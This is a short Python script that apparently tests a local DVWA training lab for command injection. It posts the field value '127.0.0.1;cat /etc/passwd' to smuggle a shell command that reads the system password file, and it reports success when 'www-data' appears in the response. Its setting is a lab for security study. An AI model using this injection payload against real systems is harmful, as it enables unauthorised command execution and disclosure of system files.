import requests

PHPSESSID = ""  # Type the PHPSESSID
header = {
    "Cookie": "security=low; PHPSESSID={}".format(PHPSESSID)
}
url = "http://localhost/DVWA/vulnerabilities/exec/"
data = {"ip": "127.0.0.1;cat /etc/passwd", "Submit": "Submit"}
res = requests.post(url=url, data=data, headers=header)
if "www-data" in str(res.content):
    print("There's command injection")
